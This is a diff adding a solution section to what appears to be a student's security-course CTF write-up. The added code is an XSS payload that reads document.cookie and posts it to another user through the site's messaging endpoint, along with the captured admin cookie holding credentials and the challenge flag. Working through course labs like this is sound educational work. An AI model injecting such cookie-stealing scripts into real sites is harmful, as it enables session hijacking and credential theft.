@@ -59,8 +59,32 @@
 <p>Username: <code>testing</code></p>
 </blockquote>
 <h2 id="solution-3">Solution</h2>
+<p>Sent the below code as the message to <code>admin</code>, the received message was</p>
+<pre><code class="language-js"><div>{
+    <span class="hljs-attr">sender</span>:admin,
+    <span class="hljs-attr">recipient</span>:reallynow,
+    <span class="hljs-attr">message</span>:
+        username=admin; 
+        password=admin; 
+        flag=csce465{xss_ftw_4f93062d}
+}
+</div></code></pre>
 <h2 id="code-1">Code</h2>
+<pre><code class="language-html"><div><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
+    <span class="hljs-keyword">var</span> formData = <span class="hljs-keyword">new</span> FormData();
+    formData.append(<span class="hljs-string">'message'</span>, <span class="hljs-built_in">document</span>.cookie);
+    formData.append(<span class="hljs-string">'recipient'</span>, <span class="hljs-string">'reallynow'</span>);
+    formData.append(<span class="hljs-string">'name'</span>, <span class="hljs-string">'admin'</span>);
+
+    <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> XMLHttpRequest();
+    xhr.open(<span class="hljs-string">'POST'</span>, <span class="hljs-string">'http://csce465shell.martincarlisle.com/problem/19369/sendmessage.php'</span>, <span class="hljs-literal">true</span>);
+    xhr.send(formData);
+
+    <span class="hljs-comment">//# sourceURL=dynamicScript.js </span>
+</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</div></code></pre>
 <h2 id="help-received">Help Received</h2>
+<p><a href="https://stackoverflow.com/questions/58217910/xmlhttprequest-not-sending-post-data">https://stackoverflow.com/questions/58217910/xmlhttprequest-not-sending-post-data</a></p>
 
     </body>
     </html>
